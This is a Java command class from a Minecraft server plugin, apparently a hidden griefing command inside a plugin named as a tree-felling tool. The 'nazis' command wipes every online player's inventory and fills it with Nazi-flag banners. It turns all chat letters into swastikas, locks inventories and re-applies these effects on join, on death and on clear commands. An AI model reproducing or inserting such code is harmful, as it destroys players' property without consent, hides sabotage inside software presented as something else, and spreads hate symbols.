package me.bow.treecapitatorultimate.commands.Griefing;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.DyeColor;
import org.bukkit.Material;
import org.bukkit.block.banner.Pattern;
import org.bukkit.block.banner.PatternType;
import org.bukkit.entity.Player;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BannerMeta;

import java.util.ArrayList;
@Command.Info(command = "nazis", description = "Put nazi sign on people's heads", category = CommandCategory.Griefing)
public class Nazis extends Command {
    private ItemStack[] banner = new ItemStack[2];
    private boolean on;

    public Nazis() {
        banner[0] = new ItemStack(Material.RED_BANNER, 64);
        banner[1] = new ItemStack(Material.RED_BANNER, 64);
        BannerMeta bannerMeta1 = (BannerMeta) banner[0].getItemMeta();
        BannerMeta bannerMeta2 = (BannerMeta) banner[0].getItemMeta();
        if (bannerMeta1 == null || bannerMeta2 == null) return; // should never happen
        bannerMeta1.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_MIDDLE));
        bannerMeta1.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_CENTER));
        bannerMeta1.addPattern(new Pattern(DyeColor.BLACK, PatternType.RHOMBUS_MIDDLE));
        bannerMeta1.addPattern(new Pattern(DyeColor.WHITE, PatternType.STRAIGHT_CROSS));
        bannerMeta1.addPattern(new Pattern(DyeColor.WHITE, PatternType.CIRCLE_MIDDLE));
        bannerMeta1.addPattern(new Pattern(DyeColor.WHITE, PatternType.CIRCLE_MIDDLE));
        bannerMeta2.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_LEFT));
        bannerMeta2.addPattern(new Pattern(DyeColor.RED, PatternType.HALF_HORIZONTAL));
        bannerMeta2.addPattern(new Pattern(DyeColor.WHITE, PatternType.CIRCLE_MIDDLE));
        bannerMeta2.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_RIGHT));
        bannerMeta2.addPattern(new Pattern(DyeColor.RED, PatternType.SQUARE_BOTTOM_RIGHT));
        bannerMeta2.addPattern(new Pattern(DyeColor.BLACK, PatternType.SQUARE_BOTTOM_RIGHT));
        bannerMeta2.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRAIGHT_CROSS));
        bannerMeta2.addPattern(new Pattern(DyeColor.BLACK, PatternType.SQUARE_TOP_LEFT));
        bannerMeta2.addPattern(new Pattern(DyeColor.RED, PatternType.BORDER));
        banner[0].setItemMeta(bannerMeta1);
        banner[1].setItemMeta(bannerMeta2);
    }

    // /minecraft:give @p red_banner{BlockEntityTag:{Base:1,Patterns:[{Pattern:ms,Color:15},{Pattern:cs,Color:15},{Pattern:mr,Color:15},{Pattern:sc,Color:0},{Pattern:mc,Color:0},{Pattern:mc,Color:0}]}}

    private void givePlayerBanners(Player pe) {
        if (!pe.isOnline()) return;
        for (int i = 0; i <= 40; i += 2)
            pe.getInventory().setItem(i, banner[0]);
        for (int i = 1; i <= 40; i += 2)
            pe.getInventory().setItem(i, banner[1]);
        pe.updateInventory();
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (on) {
            for (Player pe : Bukkit.getOnlinePlayers()) {
                if (!pe.isOnline()) return;
                pe.getInventory().clear();
            }
            on = false;
            p.sendMessage(Start.Prefix + ChatColor.RED + "Oof");
        } else {
            for (Player pe : Bukkit.getOnlinePlayers()) {
                givePlayerBanners(pe);
            }
            p.sendMessage(Start.Prefix + ChatColor.GREEN + "Heil, mein Führer!");
            on = true;
        }
    }

    @Override
    public void onPlayerJoin(PlayerJoinEvent e) {
        if (!on) return;
        Player pe = e.getPlayer();
        givePlayerBanners(pe);
    }

    @Override
    public void onPlayerDeath(PlayerDeathEvent e) {
        if (!on) return;
        givePlayerBanners(e.getEntity());
    }

    @Override
    public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
        if (!on) return;
        if (!e.getMessage().contains("inventory") && !e.getMessage().contains("clear") && !e.getMessage().contains("clean"))
            return;
        Bukkit.getScheduler().runTask(Start.Instance, () -> {
            Player pe = e.getPlayer();
            givePlayerBanners(pe);
        });
    }

    @Override
    public void onAsyncPlayerChat(AsyncPlayerChatEvent e) {
        if (!on) return;
        e.setMessage(e.getMessage().replaceAll("[a-zA-Z]", "卐"));
    }

    @Override
    public void onInventoryClick(InventoryClickEvent e) {
        if (!on) return;
        e.setCancelled(true);
    }

    @Override
    public void onPlayerDropItemEvent(PlayerDropItemEvent e) {
        if (!on) return;
        e.setCancelled(true);
    }
}
